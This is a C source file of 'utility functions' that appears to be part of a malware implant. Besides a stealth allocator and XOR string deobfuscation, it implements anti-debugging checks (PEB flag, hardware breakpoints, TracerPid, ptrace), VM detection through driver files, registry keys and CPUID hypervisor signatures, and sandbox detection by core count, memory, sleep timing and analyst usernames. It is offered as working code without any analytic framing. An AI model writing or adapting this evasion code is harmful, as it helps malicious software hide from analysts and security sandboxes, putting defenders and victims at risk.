/*
 * Utility Functions Implementation
 */

#include "utils.h"
#include "config.h"

#ifdef PLATFORM_WINDOWS
    #include <windows.h>
    #include <tlhelp32.h>
#else
    #include <unistd.h>
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <fcntl.h>
    #include <time.h>
#endif

// Custom heap for stealth allocation
static uint8_t g_heap[65536];
static size_t g_heap_pos = 0;

// Memory management
void* stealth_alloc(size_t size) {
    // Align to 8 bytes
    size = (size + 7) & ~7;
    
    if (g_heap_pos + size > sizeof(g_heap)) {
        return NULL;
    }
    
    void* ptr = &g_heap[g_heap_pos];
    g_heap_pos += size;
    
    // Zero memory
    mem_set(ptr, 0, size);
    return ptr;
}

void stealth_free(void* ptr) {
    // No-op for static heap
    (void)ptr;
}

void secure_zero(void* ptr, size_t size) {
    volatile uint8_t* p = (volatile uint8_t*)ptr;
    while (size--) {
        *p++ = 0;
    }
    // Memory barrier
    __asm__ volatile("" ::: "memory");
}

// String operations (avoid libc)
size_t str_len(const char* str) {
    size_t len = 0;
    while (*str++) len++;
    return len;
}

int str_cmp(const char* s1, const char* s2) {
    while (*s1 && (*s1 == *s2)) {
        s1++;
        s2++;
    }
    return *(unsigned char*)s1 - *(unsigned char*)s2;
}

void* mem_cpy(void* dest, const void* src, size_t n) {
    uint8_t* d = dest;
    const uint8_t* s = src;
    while (n--) *d++ = *s++;
    return dest;
}

void* mem_set(void* s, int c, size_t n) {
    uint8_t* p = s;
    while (n--) *p++ = (uint8_t)c;
    return s;
}

int mem_cmp(const void* s1, const void* s2, size_t n) {
    const uint8_t* p1 = s1;
    const uint8_t* p2 = s2;
    while (n--) {
        if (*p1 != *p2) {
            return *p1 - *p2;
        }
        p1++;
        p2++;
    }
    return 0;
}

char* str_str(const char* haystack, const char* needle) {
    size_t needle_len = str_len(needle);
    if (needle_len == 0) return (char*)haystack;
    
    while (*haystack) {
        if (mem_cmp(haystack, needle, needle_len) == 0) {
            return (char*)haystack;
        }
        haystack++;
    }
    return NULL;
}

// Obfuscation
void decrypt_string(uint8_t* str, uint8_t key) {
    while (*str) {
        *str ^= key;
        str++;
    }
}

uint32_t hash_string(const char* str) {
    uint32_t hash = 5381;
    int c;
    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c;
    }
    return hash;
}

// Time functions
uint64_t get_timestamp(void) {
#ifdef PLATFORM_WINDOWS
    LARGE_INTEGER freq, counter;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&counter);
    return (counter.QuadPart * 1000) / freq.QuadPart;
#else
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
#endif
}

void sleep_ms(uint32_t milliseconds) {
#ifdef PLATFORM_WINDOWS
    Sleep(milliseconds);
#else
    struct timespec ts;
    ts.tv_sec = milliseconds / 1000;
    ts.tv_nsec = (milliseconds % 1000) * 1000000;
    nanosleep(&ts, NULL);
#endif
}

// Random number generation
void get_random_bytes(uint8_t* buffer, size_t length) {
#ifdef PLATFORM_WINDOWS
    // Use Windows CryptGenRandom
    HCRYPTPROV hProv;
    if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        CryptGenRandom(hProv, (DWORD)length, buffer);
        CryptReleaseContext(hProv, 0);
    } else {
        // Fallback to simple PRNG
        for (size_t i = 0; i < length; i++) {
            buffer[i] = (uint8_t)(get_timestamp() ^ (i * 31));
        }
    }
#else
    // Try /dev/urandom
    int fd = open("/dev/urandom", O_RDONLY);
    if (fd >= 0) {
        read(fd, buffer, length);
        close(fd);
    } else {
        // Fallback to simple PRNG
        for (size_t i = 0; i < length; i++) {
            buffer[i] = (uint8_t)(get_timestamp() ^ (i * 31));
        }
    }
#endif
}

uint32_t get_random_int(void) {
    uint32_t val;
    get_random_bytes((uint8_t*)&val, sizeof(val));
    return val;
}

// System info
int get_process_id(void) {
#ifdef PLATFORM_WINDOWS
    return GetCurrentProcessId();
#else
    return getpid();
#endif
}

int get_cpu_count(void) {
#ifdef PLATFORM_WINDOWS
    SYSTEM_INFO sysinfo;
    GetSystemInfo(&sysinfo);
    return sysinfo.dwNumberOfProcessors;
#else
    return sysconf(_SC_NPROCESSORS_ONLN);
#endif
}

uint64_t get_memory_size(void) {
#ifdef PLATFORM_WINDOWS
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    return memInfo.ullTotalPhys;
#else
    long pages = sysconf(_SC_PHYS_PAGES);
    long page_size = sysconf(_SC_PAGE_SIZE);
    return pages * page_size;
#endif
}

// Anti-debugging detection
int detect_debugger(void) {
#ifdef PLATFORM_WINDOWS
    // Method 1: IsDebuggerPresent
    if (IsDebuggerPresent()) {
        return 1;
    }
    
    // Method 2: CheckRemoteDebuggerPresent
    BOOL debuggerPresent = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debuggerPresent);
    if (debuggerPresent) {
        return 1;
    }
    
    // Method 3: PEB check
    #ifdef _WIN64
        PPEB pPeb = (PPEB)__readgsqword(0x60);
    #else
        PPEB pPeb = (PPEB)__readfsdword(0x30);
    #endif
    if (pPeb && pPeb->BeingDebugged) {
        return 1;
    }
    
    // Method 4: Hardware breakpoints
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (GetThreadContext(GetCurrentThread(), &ctx)) {
        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) {
            return 1;
        }
    }
#else
    // Linux: Check /proc/self/status
    int fd = open("/proc/self/status", O_RDONLY);
    if (fd >= 0) {
        char buf[4096];
        ssize_t len = read(fd, buf, sizeof(buf) - 1);
        close(fd);
        
        if (len > 0) {
            buf[len] = 0;
            // Check TracerPid
            char* tracer = str_str(buf, "TracerPid:");
            if (tracer) {
                tracer += 10;
                while (*tracer == ' ' || *tracer == '\t') tracer++;
                if (*tracer != '0') {
                    return 1;  // Being traced
                }
            }
        }
    }
    
    // Try ptrace
    #ifdef __linux__
        #include <sys/ptrace.h>
        if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1) {
            return 1;  // Already being traced
        } else {
            ptrace(PTRACE_DETACH, 0, 0, 0);
        }
    #endif
#endif
    
    return 0;
}

// VM detection
int detect_vm(void) {
#ifdef PLATFORM_WINDOWS
    // Check for VM files
    const char* vm_files[] = {
        "C:\\Windows\\System32\\drivers\\VBoxGuest.sys",
        "C:\\Windows\\System32\\drivers\\vmci.sys",
        "C:\\Windows\\System32\\drivers\\vmmouse.sys",
        "C:\\Windows\\System32\\drivers\\vmhgfs.sys",
        "C:\\Windows\\System32\\drivers\\vmusbmouse.sys",
        NULL
    };
    
    for (int i = 0; vm_files[i]; i++) {
        if (GetFileAttributesA(vm_files[i]) != INVALID_FILE_ATTRIBUTES) {
            return 1;
        }
    }
    
    // Check registry for VM artifacts
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
                     "SYSTEM\\CurrentControlSet\\Services\\VBoxGuest",
                     0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return 1;
    }
#else
    // Linux: Check for VM files
    const char* vm_files[] = {
        "/sys/devices/virtual/dmi/id/product_name",
        "/proc/scsi/scsi",
        "/proc/modules",
        NULL
    };
    
    for (int i = 0; vm_files[i]; i++) {
        int fd = open(vm_files[i], O_RDONLY);
        if (fd >= 0) {
            char buf[256];
            ssize_t len = read(fd, buf, sizeof(buf) - 1);
            close(fd);
            
            if (len > 0) {
                buf[len] = 0;
                if (str_str(buf, "VirtualBox") || 
                    str_str(buf, "VMware") ||
                    str_str(buf, "QEMU") ||
                    str_str(buf, "Xen")) {
                    return 1;
                }
            }
        }
    }
#endif
    
    // CPUID check (cross-platform)
    #if defined(__i386__) || defined(__x86_64__) || defined(_M_IX86) || defined(_M_X64)
        int cpu_info[4] = {0};
        #ifdef _MSC_VER
            __cpuid(cpu_info, 0x40000000);
        #else
            __asm__ volatile(
                "cpuid"
                : "=a"(cpu_info[0]), "=b"(cpu_info[1]), 
                  "=c"(cpu_info[2]), "=d"(cpu_info[3])
                : "a"(0x40000000)
            );
        #endif
        
        // Check for hypervisor signatures
        if (cpu_info[1] == 0x61774D56 || // "VMwa"
            cpu_info[1] == 0x4B4D564B || // "KVMK"  
            cpu_info[1] == 0x56425856 || // "VBox"
            cpu_info[1] == 0x6F727458) { // "Xeno"
            return 1;
        }
    #endif
    
    return 0;
}

// Sandbox detection
int detect_sandbox(void) {
    // Check for common sandbox artifacts
    
    // 1. Check for limited CPU cores (sandboxes often limit to 1-2 cores)
    if (get_cpu_count() <= 1) {
        return 1;
    }
    
    // 2. Check for low memory (sandboxes often have <2GB RAM)
    if (get_memory_size() < (2ULL * 1024 * 1024 * 1024)) {
        return 1;
    }
    
    // 3. Check for fast sleep (sandboxes may accelerate time)
    uint64_t start = get_timestamp();
    sleep_ms(100);
    uint64_t elapsed = get_timestamp() - start;
    
    if (elapsed < 90 || elapsed > 150) {
        return 1;  // Sleep time abnormal
    }
    
#ifdef PLATFORM_WINDOWS
    // Check for sandbox usernames
    char username[256];
    DWORD size = sizeof(username);
    if (GetUserNameA(username, &size)) {
        const char* sandbox_users[] = {
            "sandbox", "virus", "malware", "sample",
            "test", "john", "administrator", NULL
        };
        
        for (int i = 0; sandbox_users[i]; i++) {
            if (str_cmp(username, sandbox_users[i]) == 0) {
                return 1;
            }
        }
    }
#endif
    
    return 0;
}

// Anti-debug trap
void anti_debug_trap(void) {
    #ifdef PLATFORM_WINDOWS
        __debugbreak();
    #else
        __asm__ volatile("int3");
    #endif
}

// Error handling
const char* error_to_string(error_code_t err) {
    switch (err) {
        case ERR_SUCCESS: return "Success";
        case ERR_INVALID_PARAM: return "Invalid parameter";
        case ERR_OUT_OF_MEMORY: return "Out of memory";
        case ERR_CONNECTION_FAILED: return "Connection failed";
        case ERR_TIMEOUT: return "Operation timed out";
        case ERR_ACCESS_DENIED: return "Access denied";
        case ERR_NOT_FOUND: return "Not found";
        default: return "Unknown error";
    }
}